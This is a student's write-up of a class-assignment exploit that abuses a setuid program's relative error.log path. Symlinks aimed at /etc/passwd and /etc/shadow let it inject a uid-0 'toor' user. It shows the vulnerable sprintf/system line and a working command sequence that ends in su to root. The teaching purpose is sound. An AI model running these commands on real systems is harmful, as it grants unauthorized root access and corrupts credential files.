# Symlink Attack

The following is an interesting exploit I found while working 
on an assignment for my Systems Security class. The assignment was 
a standard buffer overflow on a setuid program. By exploiting the overflow,
a root shell could be gained.

The program was setuid as it needed to read from a root owned file (scores.txt). On
an error, the program would write to file called errors.log.

The program used relative links to these files, and thus we can use symlinks in our
current directory to point these names to other files. The scores.txt could be used
to read from colon-delimited files. This symlink _would_ be useful for reading
from /etc/shadow, but unfortunately, this particular program wouldn't allow 
us to read the second field, only the third and higher (and the password hash
is the second).

Using errors.log, however, we could write to arbitrary files. Just like we could read
from /etc/shadow, we can write to /etc/shadow and /etc/passwd. This will allow us
to create a new user, toor, that has an uid of 0, giving it root privileges!

## The code

The code provided in the download link above is only a part of the assignment; the
class assignments are sometimes removed, so I have removed everything not related to
the current topic.

The line vulnerable to our exploit is the following:

		sprintf(command, "echo \"%s: Invalid user name or SSN: %s,%s\"|cat >> error.log", 
			ctime(&current_time), argv[1], argv[2]);

The program will execute the variable command using system, and the output is appended to the file error.log in the current directory. This is exactly what we need for a symlink attack.

When the program is ran, we will see the following:

		./a.out 1 2
			Invalid user name or SSN.
		cat error.log 
			Sun Oct 29 11:13:10 2017
			: Invalid user name or SSN: 1,2


If we create a symlink in the currect directory named error.log that points to /etc/passwd, we can append to that file. The nice thing about /etc/passwd and /etc/shadow is that they ignore lines that
are not formatted correctly (for our purposes, anyways). Thus, if we enter "\ntoor:hash:..." as our second argument we can create a new user in the system.

## The Exploit

BEFORE RUNNING: This exploit messes with critical files for your computer. I would highly, highly reccomend you do NOT do this on anything other than a virtual machine, and that you take a snapshot. This was tested on two different linux
operating systems, and should work on any Linux machine. Just make sure that the setuid program has been setuid to root.

To exploit the program, use the following commands with the above python script:

		PASS=`python write_user.py p`
		SHADOW=`python write_user.py`
		cd /tmp
		ln -s /etc/passwd error.log 					 
		/root/course_scores/getscore a "$PASS" 
		rm error.log 							
		ln -s /etc/shadow error.log 
		/root/course_scores/getscore a "$SHADOW" 
		su toor

The python script simply prints the line for /etc/shadow; if a p is provided, it prints the line for /etc/passwd.
